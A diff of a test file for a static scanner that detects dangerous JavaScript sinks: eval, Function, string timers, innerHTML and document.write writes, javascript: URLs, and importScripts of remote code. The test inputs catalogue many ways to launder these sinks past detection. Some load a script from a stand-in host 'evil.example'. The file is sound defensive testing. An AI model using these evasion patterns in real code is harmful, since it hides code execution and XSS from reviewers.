@@ -19,13 +19,13 @@ import {
   DOM_MEMBER_SINKS,
   DYNAMIC_CODE_SINKS,
   findDynamicCodeSinks,
+  findForbiddenGlobalReferencesIn,
+  findJavascriptUrlsIn,
   findMemberSinkUses,
   REMOTE_DYNAMIC_IMPORT_SINK,
   REMOTE_IMPORT_SCRIPTS_SINK,
   SOURCE_CODE_SINKS,
-  scanSourceForSinks,
   stripComments,
-  tokenize,
 } from './dangerous-code-patterns.js';
 
 /** Does the shared sink set fire on this source? */
@@ -722,6 +722,60 @@ describe('constant string folding', () => {
   });
 });
 
+describe('a sink that reaches a name AFTER it is declared', () => {
+  // A declaration is only where a name starts.  Reading solely its initializer
+  // missed every form where the sink arrives later — and `let x; x = eval` is
+  // the plainest of them.
+  it.each([
+    ['a bare declaration then an assignment', 'let execute; execute = eval; execute(payload)'],
+    ['an assignment through a chain', 'let a; let b; b = Function; a = b; a("x")()'],
+    [
+      'an object reached through an alias',
+      'const registry = {}; registry.run = eval; const alias = registry; alias.run(payload)',
+    ],
+    [
+      'an alias of an alias',
+      'const a = {}; a.run = eval; const b = a; const c = b; c.run(payload)',
+    ],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it('does not flag an unrelated reassignment', () => {
+    expect(fires("let f; f = handler; f('x')")).toBe(false);
+  });
+});
+
+describe('a sink reached through SELECTION or a binding', () => {
+  // Selection and binding are the two ways a value arrives somewhere other than
+  // where it was written, and each was invisible until both were followed.
+  it.each([
+    ['a `||` fallback', '(eval || (() => undefined))(payload)'],
+    ['a `??` fallback', '(eval ?? other)(payload)'],
+    ['a `&&` guard, sink on the right', '(ready && eval)(payload)'],
+    [
+      'a destructuring assignment',
+      'let e: (s: string) => unknown = () => undefined; ({ run: e } = { run: eval }); e(payload)',
+    ],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    ['timer code held in a const', "const code = 'alert(1)'; setTimeout(code, 0)"],
+    ['timer code chosen by a ternary', "const c = flag ? 'alert(1)' : other; setTimeout(c, 0)"],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    ['an unrelated selection', '(handler || other)(payload)'],
+    ['a timer given a bound FUNCTION', 'const fn = tick; setTimeout(fn, 0)'],
+  ])('does not flag %s', (_label, code) => {
+    expect(fires(code)).toBe(false);
+  });
+});
+
 describe('sinks written INTO an existing container', () => {
   // Round 22. Building a registry empty and filling it afterwards is the
   // ordinary way one is populated, so reading only the LITERAL left the whole
@@ -746,11 +800,26 @@ describe('sinks written INTO an existing container', () => {
     ).toHaveLength(2);
   });
 
-  it('does not leak an assigned property into the SHARED global table', () => {
+  it('does not leak an assigned property into an UNRELATED receiver', () => {
     // …and must NOT reach every other holder of that table, which is why the
     // extension copies rather than mutating in place.
-    expect(fires("const g = globalThis; g.zzz = eval; self.zzz('x')")).toBe(false);
+    expect(fires("const a = {}; const b = {}; a.zzz = eval; b.zzz('x')")).toBe(false);
   });
+
+  it.each([
+    ['globalThis then self', "globalThis.zzz = eval; self.zzz('x')"],
+    ['window then globalThis', "window.zzz = eval; globalThis.zzz('x')"],
+    ['an alias of one, read through another', "const g = globalThis; g.zzz = eval; top.zzz('x')"],
+  ])(
+    'follows a global written through one spelling and called through another (%s)',
+    (_l, code) => {
+      // `window`, `self`, `globalThis`, `top` and friends are ONE object at
+      // runtime, so these all execute.  Keeping the spellings apart filed the
+      // write under one key and looked the read up under another, and a test here
+      // asserted that miss was correct — a bypass with a passing test over it.
+      expect(fires(code)).toBe(true);
+    },
+  );
 
   it.each([
     ['a non-sink assignment', "const o = {}; o.run = handler; o.run('x')"],
@@ -759,6 +828,524 @@ describe('sinks written INTO an existing container', () => {
     ['an assigned timer given a function', 'const o = {}; o.t = setTimeout; o.t(tick, 0)'],
   ])('does not flag %s', (_label, code) => {
     expect(fires(code)).toBe(false);
+  });
+});
+
+describe('a DOM sink written or invoked indirectly', () => {
+  const dom = (code: string): boolean => findMemberSinkUses(code, DOM_MEMBER_SINKS).length > 0;
+
+  it.each([
+    ['a logical-OR assignment', 'node.innerHTML ||= payload'],
+    ['a nullish assignment', 'node.outerHTML ??= payload'],
+    ['a logical-AND assignment', 'node.innerHTML &&= payload'],
+  ])('catches %s — it writes the property too', (_label, code) => {
+    expect(dom(code)).toBe(true);
+  });
+
+  it.each([
+    ['`.call`', 'document.write.call(document, payload)'],
+    ['`Reflect.apply`', 'Reflect.apply(document.write, document, [payload])'],
+  ])('catches document.write through %s', (_label, code) => {
+    expect(dom(code)).toBe(true);
+  });
+
+  it('does not flag a property that is only READ', () => {
+    expect(dom('const markup = node.innerHTML;')).toBe(false);
+  });
+});
+
+describe('a sink handed back by a local function', () => {
+  it.each([
+    ['an arrow returning eval', 'const get = () => eval; get()(payload)'],
+    ['a function returning Function', 'function get() { return Function; } get()("x")()'],
+    ['an arrow returning a timer', "const g = () => setTimeout; g()('evil()', 0)"],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it('does not flag a function returning something else', () => {
+    expect(fires('const get = () => handler; get()(payload)')).toBe(false);
+  });
+});
+
+describe('sinks reached through indirection review found open', () => {
+  // Six bypasses reported against the first value-flow cut, and none of them
+  // was a missing SPELLING — each was a place the relation stopped: a callee it
+  // would not resolve, a binding it did not model, an identity it split in two,
+  // a ceiling it returned quietly from.  They are pinned together because they
+  // were one defect, and a regression in any of them is a regression in it.
+  it.each([
+    // The callee was resolved by a private walker that knew only a bare name.
+    [
+      'an alias of a sink-returning function',
+      'const get = () => eval; const alias = get; alias()(payload)',
+    ],
+    ['a sink-returning function assigned later', 'let get; get = () => eval; get()(payload)'],
+    [
+      'a sink-returning function held in an object',
+      'const box = { get: () => eval }; box.get()(payload)',
+    ],
+    // A parameter had no incoming edge at all, so any local wrapper hid a sink.
+    ['a sink passed into a wrapper', 'function invoke(fn) { fn(payload); } invoke(eval)'],
+    ['a sink passed into an arrow wrapper', 'const invoke = (fn) => fn(payload); invoke(Function)'],
+    [
+      'a sink passed through TWO wrappers',
+      'function inner(g) { g(payload); } function outer(f) { inner(f); } outer(eval)',
+    ],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it('does not stop short when the sink is preceded by padding', () => {
+    // The ceiling used to be 512 values and returning early reported the file
+    // clean, so padding the search was all a bypass needed.
+    const padding = Array.from({ length: 600 }, () => 'fn = handler;').join(' ');
+    expect(fires(`let fn; ${padding} fn = eval; fn(payload)`)).toBe(true);
+  });
+
+  it('still does not flag a wrapper handed something harmless', () => {
+    expect(fires('function invoke(fn) { fn(payload); } invoke(handler)')).toBe(false);
+  });
+});
+
+describe('every position the value relation governs', () => {
+  // Written by sweeping the rules rather than waiting for the next review
+  // round.  The previous two rounds were each "one more place the relation
+  // stopped", so once "a sink is a value" and "a call yields a value" were the
+  // rules, the question became WHERE ELSE those hold — and six of these were
+  // still open when asked.
+  it.each([
+    // A tagged template invokes its tag, so it is a call in every respect.
+    ['a sink returned to a tagged template', 'const t = () => eval; t`x`(payload)'],
+    // The invoker spellings deliver arguments one place along, or inside an
+    // array — so a wrapper's parameters lined up against the `thisArg`.
+    ['a sink passed via .call', 'function invoke(fn) { fn(payload); } invoke.call(null, eval)'],
+    ['a sink passed via .apply', 'function invoke(fn) { fn(payload); } invoke.apply(null, [eval])'],
+    [
+      'a sink passed via Reflect.apply',
+      'function invoke(fn) { fn(payload); } Reflect.apply(invoke, null, [eval])',
+    ],
+    // A getter runs on READ, so the property access already IS the value.
+    ['a sink behind a getter', 'const o = { get run() { return eval; } }; o.run(payload)'],
+    // A class instance is a container like an object literal is.
+    ['a sink returned by a class method', 'class C { m() { return eval; } } new C().m()(payload)'],
+    ['a sink held in a class property', 'class C { run = eval; } new C().run(payload)'],
+    ['a sink behind a class getter', 'class C { get run() { return eval; } } new C().run(payload)'],
+    ['a sink as a default parameter', 'function invoke(fn = eval) { fn(payload); } invoke()'],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    [
+      'a harmless value via .call',
+      'function invoke(fn) { fn(payload); } invoke.call(null, handler)',
+    ],
+    ['a harmless getter', 'const o = { get run() { return handler; } }; o.run(payload)'],
+    ['a harmless class method', 'class C { m() { return handler; } } new C().m()(payload)'],
+  ])('does not flag %s', (_label, code) => {
+    expect(fires(code)).toBe(false);
+  });
+});
+
+describe('sinks that are not written as sinks', () => {
+  it.each([
+    // A subclass inherits the constructor: `new F('code')` compiles code.
+    ['a Function subclass', "class F extends Function {}; new F('return payload')()"],
+    ['a Function subclass expression', "const F = class extends Function {}; new F('x')()"],
+    ['a subclass of a subclass', "class A extends Function {}; class B extends A {}; new B('x')()"],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    ['a copied Reflect.construct', "const c = Reflect.construct; c(Function, ['return 1'])()"],
+    ['a copied Reflect.apply', "const a = Reflect.apply; a(eval, null, ['x'])"],
+    ['a Proxy over a sink', 'const p = new Proxy(eval, {}); p(payload)'],
+    ['a Proxy over a sink, aliased', 'const p = new Proxy(eval, {}); const q = p; q(payload)'],
+  ])('catches %s', (_label, code) => {
+    // A reflective helper and a proxy are VALUES: copying one does not change
+    // what it invokes, and matching the access syntax at the call saw only the
+    // spelled form.
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    ['String() coercion', 'setTimeout(String(payload), 0)'],
+    ['a .toString() call', 'setInterval(payload.toString(), 0)'],
+    ['a coercion held in a binding', 'const code = String(payload); setTimeout(code, 0)'],
+  ])('catches an implicit-eval timer through %s', (_label, code) => {
+    // The host compiles whatever string it is handed; recognising only literal
+    // syntax read an explicit coercion as clean.
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    ['a function argument', 'setTimeout(fn, 0)'],
+    ['the String constructor itself', 'setTimeout(String, 0)'],
+  ])('does not flag a timer given %s', (_label, code) => {
+    expect(fires(code)).toBe(false);
+  });
+
+  it.each([
+    // The slot table kept only the LAST write, so a sink invoked before being
+    // overwritten disappeared.  What a slot CAN hold is all of them.
+    ['a sink overwritten after use', 'const o = {}; o.run = eval; o.run(payload); o.run = safe;'],
+    [
+      'a sink written after a safe one',
+      'const o = {}; o.run = safe; o.run = eval; o.run(payload);',
+    ],
+    // A reflective setter fills a slot exactly as `o.run = eval` does.
+    [
+      'a sink assigned reflectively',
+      'const o = {}; Object.assign(o, { run: eval }); o.run(payload);',
+    ],
+    ['a sink set reflectively', "const o = {}; Reflect.set(o, 'run', eval); o.run(payload);"],
+    [
+      'a sink defined reflectively',
+      "const o = {}; Object.defineProperty(o, 'run', { value: eval }); o.run(payload);",
+    ],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    // A SPREAD contributes the members of what it spreads; it has no `name`,
+    // so the member walk skipped it entirely.
+    ['a spread source', 'const o = {}; Object.assign(o, { ...{ run: eval } }); o.run(payload);'],
+    // `Object.assign` RETURNS its target, so the fluent form reads the slot off
+    // the call — a container that is never bound to anything.
+    ['the fluent form', 'Object.assign({}, { run: eval }).run(payload);'],
+    // `f.call(thisArg, …)` invokes `f`; when `f` IS `Function.prototype.call`,
+    // it invokes its FIRST ARGUMENT instead.
+    ['a borrowed Function.prototype.call', 'Function.prototype.call.call(eval, null, payload)'],
+    ['a borrowed Function.prototype.apply', 'Function.prototype.apply.call(eval, null, [payload])'],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    // A `Map` is a container with a different spelling; reading only property
+    // syntax let a sink cross the standard collection API untouched.
+    ['a Map slot', "const m = new Map(); m.set('run', eval); m.get('run')(payload)"],
+    // An iteration method hands each ELEMENT to the callback, so the
+    // callback's first parameter is bound by the receiver, not by an argument
+    // at the same index.
+    ['an element handed to forEach', 'const arr = [eval]; arr.forEach((fn) => fn(payload))'],
+    ['an element handed to map', 'const arr = [eval]; arr.map((fn) => fn(payload))'],
+    // The descriptor's `value` BY NAME: a field written before it put another
+    // member at index 0, and reading that one took the wrong expression.
+    [
+      'a descriptor with a field before value',
+      'Object.defineProperties(o, { run: { writable: true, value: eval } }); o.run(payload)',
+    ],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    ['a harmless Map slot', "const m = new Map(); m.set('run', safe); m.get('run')(payload)"],
+    ['a Map read at another key', "const m = new Map(); m.set('a', eval); m.get('b')(payload)"],
+    ['a harmless Map seed', "const m = new Map([['run', safe]]); m.get('run')(payload)"],
+    ['a Map seeded at another key', "const m = new Map([['a', eval]]); m.get('b')(payload)"],
+    ['a harmless prototype', 'Object.create({ run: safe }).run(payload)'],
+    ['a harmless element iterated', 'const arr = [handler]; arr.forEach((fn) => fn(payload))'],
+    [
+      'a descriptor with no value field',
+      'Object.defineProperties(o, { run: { get: g } }); o.run(payload)',
+    ],
+    ['a harmless fluent assign', 'Object.assign({}, { run: safe }).run(payload);'],
+    ['a harmless borrowed invoker', 'Function.prototype.call.call(handler, null, payload)'],
+  ])('does not flag %s', (_label, code) => {
+    expect(fires(code)).toBe(false);
+  });
+
+  it('does not flag a container whose every write is harmless', () => {
+    expect(
+      fires('const o = {}; o.run = safe; Object.assign(o, { run: other }); o.run(payload);'),
+    ).toBe(false);
+  });
+
+  it('does not flag a Proxy over something harmless', () => {
+    expect(fires('const p = new Proxy(handler, {}); p(payload)')).toBe(false);
+  });
+
+  it('does not flag a class extending something else', () => {
+    expect(fires("class F extends Base {}; new F('x')()")).toBe(false);
+  });
+});
+
+describe('the same sweep, over the helpers themselves', () => {
+  const dom = (code: string): boolean => findMemberSinkUses(code, DOM_MEMBER_SINKS).length > 0;
+
+  // The helpers were resolved by a PRIVATE walk that knew bindings and nothing
+  // else — the same "one more walker outside the relation" defect twice
+  // removed from this file already.  They go through the relation now, so a
+  // helper reached any way a value can be reached resolves.
+  it.each([
+    [
+      'a setter passed into a wrapper',
+      'function w(set) { set(node, "innerHTML", p); } w(Reflect.set)',
+    ],
+    [
+      'a setter returned by a function',
+      'function g() { return Object.assign; } g()(node, { innerHTML: p })',
+    ],
+    ['a setter held in an object', 'const o = { a: Object.assign }; o.a(node, { innerHTML: p })'],
+    ['Object.defineProperties', 'Object.defineProperties(node, { innerHTML: { value: p } })'],
+  ])('catches %s', (_label, code) => {
+    expect(dom(code)).toBe(true);
+  });
+
+  it.each([
+    [
+      'an invoker passed into a wrapper',
+      'function w(f) { f(eval, null, ["x"]); } w(Reflect.apply)',
+    ],
+    [
+      'an invoker returned by a function',
+      'function g() { return Reflect.construct; } g()(Function, ["x"])()',
+    ],
+    ['a revocable proxy', 'const { proxy } = Proxy.revocable(eval, {}); proxy(payload)'],
+    // The coercion is a fact about the VALUE: nothing in the argument's syntax
+    // says this produces a string, and the relation is what knows.
+    [
+      'String reached through a parameter',
+      'function w(s) { setTimeout(s(payload), 0); } w(String)',
+    ],
+    ['JSON.stringify', 'setTimeout(JSON.stringify(payload), 0)'],
+    ['toLocaleString', 'setTimeout(payload.toLocaleString(), 0)'],
+    ['a joined array', "setTimeout(parts.join(''), 0)"],
+    // A generator hands values out by YIELDING; the iterator protocol carries
+    // them back through `.next().value`.
+    ['a yielded sink', 'function* g() { yield eval; } g().next().value(payload)'],
+    ['an async generator', 'async function* g() { yield eval; } (await g().next()).value(payload)'],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    ['an aliased Proxy constructor', 'const P = Proxy; const p = new P(eval, {}); p(payload)'],
+    ['an aliased Reflect receiver', 'const R = Reflect; R.apply(eval, null, ["x"])'],
+  ])('catches %s', (_label, code) => {
+    // The RECEIVER is a value too, so resolving the helper while comparing the
+    // receiver's text left every one of them aliasable.
+    expect(fires(code)).toBe(true);
+  });
+
+  it('catches an aliased Object receiver on a markup write', () => {
+    expect(dom('const O = Object; O.assign(node, { innerHTML: p })')).toBe(true);
+  });
+
+  it.each([
+    ['a harmless setter alias', 'Object.defineProperties(node, { textContent: { value: p } })'],
+  ])('does not flag %s', (_label, code) => {
+    expect(dom(code)).toBe(false);
+  });
+});
+
+describe('the BOUNDED rule: `eval` and `Function` are never mentioned', () => {
+  const refs = (code: string): number =>
+    (findForbiddenGlobalReferencesIn([{ path: 'x.ts', content: code }]).get('x.ts') ?? []).length;
+
+  // Every laundering route six review rounds surfaced still has to NAME the
+  // global.  Asking "is it invoked" is unbounded — a value reaches a call
+  // through a container, a prototype, a proxy, an iterator, a borrowed method
+  // — and modelling one shape invites the next, which is the spelling-regex
+  // trap one level up.  Asking "is it mentioned" ends the list.
+  it.each([
+    ['a Map constructor seed', "const m = new Map([['run', eval]]); m.get('run')(p)"],
+    ['an Object.create prototype', 'Object.create({ run: eval }).run(p)'],
+    ['a revocable proxy', 'const { proxy } = Proxy.revocable(eval, {}); proxy(p)'],
+    ['a borrowed invoker', 'Function.prototype.call.call(eval, null, p)'],
+    ['a generator boundary', 'function* g() { yield eval; } g().next().value(p)'],
+    ['an iteration callback', 'const a = [eval]; a.forEach((f) => f(p))'],
+    ['a reflective write', 'Object.assign(o, { run: eval }); o.run(p)'],
+    // The point of the rule: shapes NOBODY has modelled are covered too.
+    ['a shape the relation does not model', 'const k = Object.fromEntries([["r", eval]]); k.r(p)'],
+    // …and one the invocation analysis could never catch, because there is no
+    // invocation in this file at all.
+    ['a sink stored and exported', 'export const stash = { run: eval };'],
+  ])('catches %s', (_label, code) => {
+    expect(refs(code)).toBeGreaterThan(0);
+  });
+
+  it.each([
+    // The global reached through a PROPERTY of the global object.  The
+    // declaration-name exclusion was skipping this, so the rule had a hole in
+    // exactly the shape it exists to close.
+    ['globalThis.eval', 'const f = globalThis.eval;'],
+    ['window.Function', 'const f = window.Function;'],
+    ["self['eval']", 'const f = self["eval"];'],
+    ['an aliased global object', 'const g = globalThis; const f = g.eval;'],
+  ])('catches %s', (_label, code) => {
+    expect(refs(code)).toBeGreaterThan(0);
+  });
+
+  it.each([
+    // Erased at build; runs nothing.
+    ['a type annotation', 'export function run(fn: Function): void { fn(); }'],
+    // The receiver is resolved, so a property on an unrelated object is not
+    // the global.
+    ['a property named eval on some object', 'const o = { eval: 1 }; export const v = o.eval;'],
+    // Not the global.
+    ['a property named eval', 'const o = { eval: 1 }; export const v = o.eval;'],
+    ['a local that shadows it', 'export function f(eval: string) { return eval; }'],
+    // Doctrine has to be discussable.
+    ['prose in a comment', '// never use eval or Function here\nexport const x = 1;'],
+    ['a string mentioning it', 'export const msg = "do not use eval";'],
+  ])('does not flag %s', (_label, code) => {
+    expect(refs(code)).toBe(0);
+  });
+
+  it('reports the real first-party tree as clean', async () => {
+    // Zero references across 1284 files is what makes the rule affordable:
+    // it is the code's existing behaviour written down, not a new constraint.
+    const { execFileSync } = await import('node:child_process');
+    const { readFileSync } = await import('node:fs');
+    const { resolve } = await import('node:path');
+    const root = resolve(import.meta.dirname, '..');
+    const files = execFileSync('git', ['ls-files', 'apps', 'packages'], {
+      cwd: root,
+      encoding: 'utf-8',
+    })
+      .split('\n')
+      .filter((each) => /\.(ts|tsx)$/.test(each) && !/\.test\.|\.spec\./.test(each));
+    const found = findForbiddenGlobalReferencesIn(
+      files.map((path) => ({ path, content: readFileSync(resolve(root, path), 'utf-8') })),
+    );
+    expect([...found.values()].flat()).toEqual([]);
+  });
+});
+
+describe('a receiver-specific DOM sink reached through an ALIAS', () => {
+  const dom = (code: string): boolean => findMemberSinkUses(code, DOM_MEMBER_SINKS).length > 0;
+
+  it.each([
+    ['one alias', 'const doc = document; doc.write(payload)'],
+    ['an alias of an alias', 'const a = document; const b = a; b.write(payload)'],
+  ])('catches document.write through %s', (_label, code) => {
+    expect(dom(code)).toBe(true);
+  });
+
+  it.each([
+    ['a method copied into a local', 'const write = document.write; write(payload)'],
+    ['a method copied and then aliased', 'const w = document.write; const w2 = w; w2(payload)'],
+    ['a method held in an object', 'const box = { w: document.write }; box.w(payload)'],
+    ['a method returned by a local function', 'const get = () => document.write; get()(payload)'],
+  ])('catches document.write %s', (_label, code) => {
+    // A member sink is a VALUE, so copying it out of the receiver does not
+    // shed its identity.  Matching the access syntax and its parent meant one
+    // `const` hid the most explicitly forbidden call in the project.
+    expect(dom(code)).toBe(true);
+  });
+
+  it.each([
+    // Built rather than written out: a literal `${` inside a plain string is
+    // an interpolation this file does not intend, which is what `tpl` exists
+    // for elsewhere here.
+    ['through a tagged template', `document.write\`<b>$${'{'}payload}</b>\``],
+    ['through an optional call', 'document.write?.(payload)'],
+    ['passed into a wrapper', 'function w(f) { f(payload); } w(document.write)'],
+    ['returned by a local function', 'function g() { return document.write; } g()(payload)'],
+    ['held in an array', 'const a = [document.write]; a[0](payload)'],
+  ])('catches document.write %s', (_label, code) => {
+    expect(dom(code)).toBe(true);
+  });
+
+  it.each([
+    ['Object.assign', 'Object.assign(node, { innerHTML: payload })'],
+    ['Object.assign, computed key', "Object.assign(node, { ['outer' + 'HTML']: payload })"],
+    ['Reflect.set', "Reflect.set(node, 'outerHTML', payload)"],
+    ['Object.defineProperty', "Object.defineProperty(node, 'innerHTML', { value: payload })"],
+  ])('catches a markup write through %s', (_label, code) => {
+    // The browser runs the SAME setter for each of these, so recognising only
+    // an assignment TARGET left the most direct XSS write three synonyms.
+    expect(dom(code)).toBe(true);
+  });
+
+  it.each([
+    [
+      'an aliased Object.assign',
+      'const assign = Object.assign; assign(node, { innerHTML: payload })',
+    ],
+    ['an aliased Reflect.set', "const set = Reflect.set; set(node, 'outerHTML', payload)"],
+  ])('catches a markup write through %s', (_label, code) => {
+    // The setter is a value like any other: copying it does not change which
+    // property it writes.
+    expect(dom(code)).toBe(true);
+  });
+
+  it('does not flag an aliased setter writing something harmless', () => {
+    expect(dom('const assign = Object.assign; assign(node, { textContent: payload })')).toBe(false);
+  });
+
+  it('catches a markup write through a SPREAD source', () => {
+    expect(dom('Object.assign(node, { ...{ innerHTML: payload } })')).toBe(true);
+  });
+
+  it('does not flag a harmless property spread in', () => {
+    expect(dom('Object.assign(node, { ...{ textContent: payload } })')).toBe(false);
+  });
+
+  it('does not flag an unrelated property written reflectively', () => {
+    expect(dom('Object.assign(node, { textContent: payload })')).toBe(false);
+  });
+
+  it('does not flag an unrelated receiver', () => {
+    expect(dom('const obj = other; obj.write(payload)')).toBe(false);
+  });
+
+  it('does not flag an unrelated method copied into a local', () => {
+    expect(dom('const write = other.write; write(payload)')).toBe(false);
+  });
+});
+
+describe('every mechanism, with every predicate', () => {
+  // The point of resolving value flow through ONE relation.  Three separate
+  // walkers each knew a different subset of mechanisms, so a sink NAME resolved
+  // through a container while a code-argument PREDICATE applied to the same
+  // container did not.  Four of these were live false negatives before the
+  // relation was unified; the rest are the combinations that must keep working.
+  const imports = [...DYNAMIC_CODE_SINKS, REMOTE_IMPORT_SCRIPTS_SINK];
+  const remote = (code: string): boolean => findDynamicCodeSinks(code, imports).length > 0;
+  const dom = (code: string): boolean => findMemberSinkUses(code, DOM_MEMBER_SINKS).length > 0;
+
+  it.each([
+    [
+      'a timer string through a function return',
+      "const get = () => 'alert(1)'; setTimeout(get(), 0)",
+    ],
+    ['a timer string through a container', "const o = { code: 'alert(1)' }; setTimeout(o.code, 0)"],
+    ['a timer string through a later assignment', "let c; c = 'alert(1)'; setTimeout(c, 0)"],
+    [
+      'a timer string through destructuring',
+      "const { code } = { code: 'alert(1)' }; setTimeout(code, 0)",
+    ],
+  ])('applies the STRING predicate through %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    ['a binding', "const u = 'https://evil.example/x.js'; importScripts(u)"],
+    ['a selection', "importScripts(fallback || 'https://evil.example/x.js')"],
+    ['a function return', "const u = () => 'https://evil.example/x.js'; importScripts(u())"],
+  ])('applies the URL predicate through %s', (_label, code) => {
+    expect(remote(code)).toBe(true);
+  });
+
+  it.each([
+    ['a container', 'const o = { d: document }; o.d.write(payload)'],
+    ['a function return', 'const get = () => document; get().write(payload)'],
+  ])('resolves a member sink RECEIVER through %s', (_label, code) => {
+    expect(dom(code)).toBe(true);
+  });
+
+  it.each([
+    ['a function argument through a container', 'const o = { fn: tick }; setTimeout(o.fn, 0)'],
+    ['a same-origin URL through a binding', "const u = '/local.js'; importScripts(u)"],
+  ])('still passes %s', (_label, code) => {
+    expect(remote(code)).toBe(false);
   });
 });
 
@@ -799,23 +1386,6 @@ describe('the assembled sink sets', () => {
   });
 });
 
-describe('tokenize', () => {
-  it('skips comments, strings, templates and regex literals', () => {
-    const kinds = tokenize('// c\n/* c */ "s" `t` ; /re/ ; x').map((t) => t.kind);
-    expect(kinds).toEqual(['string', 'template', 'punct', 'regex', 'punct', 'ident']);
-  });
-
-  it('keeps a template with an interpolation as ONE token', () => {
-    expect(tokenize(`\`a\${ {b:1} }c\``)).toHaveLength(1);
-  });
-
-  it('does not run an unterminated string past its line', () => {
-    // An unterminated literal must not swallow the rest of the file and hide
-    // whatever follows it.
-    expect(fires("const bad = 'oops\neval('x');")).toBe(true);
-  });
-});
-
 describe('stripComments', () => {
   // No longer load-bearing for sink detection, but still used for the
   // update-channel MARKER checks, so its offset-preserving contract stands.
@@ -833,16 +1403,30 @@ describe('stripComments', () => {
   });
 });
 
-describe('scanSourceForSinks (textual DOM patterns)', () => {
-  const DOM = [{ pattern: /\.innerHTML\s*=/, label: 'innerHTML' }];
+describe('javascript: URLs', () => {
+  const urls = (code: string): string[] =>
+    (findJavascriptUrlsIn([{ path: 'x.ts', content: code }]).get('x.ts') ?? []).map(
+      (finding) => `${finding.line}:${finding.label}`,
+    );
 
-  it('matches over the whole text and reports the line', () => {
-    const code = ['const a = 1;', 'el.innerHTML = html;'].join('\n');
-    expect(scanSourceForSinks(code, DOM)).toEqual([{ label: 'innerHTML', line: 2 }]);
+  it('flags the plain spelling', () => {
+    expect(urls(`const href = 'javascript:alert(1)';`)).toHaveLength(1);
   });
 
-  it('does not match inside a comment', () => {
-    expect(scanSourceForSinks('// el.innerHTML = x\n', DOM)).toEqual([]);
+  // The pattern this replaced required the quote immediately before the scheme,
+  // so every equivalent spelling slipped past it — and all of them navigate.
+  it.each([
+    ['a leading space the URL parser trims', `const h = ' javascript:alert(1)';`],
+    ['an escape', String.raw`const h = '\x6aavascript:alert(1)';`],
+    ['a tab inside the scheme', String.raw`const h = 'java\tscript:alert(1)';`],
+    ['a template with no holes', 'const h = `javascript:alert(1)`;'],
+  ])('flags %s', (_label, code) => {
+    expect(urls(code)).toHaveLength(1);
+  });
+
+  it('does not flag a comment or an unrelated URL', () => {
+    expect(urls('// javascript:alert(1)\n')).toEqual([]);
+    expect(urls(`const h = 'https://example.test/javascript:x';`)).toEqual([]);
   });
 });
 
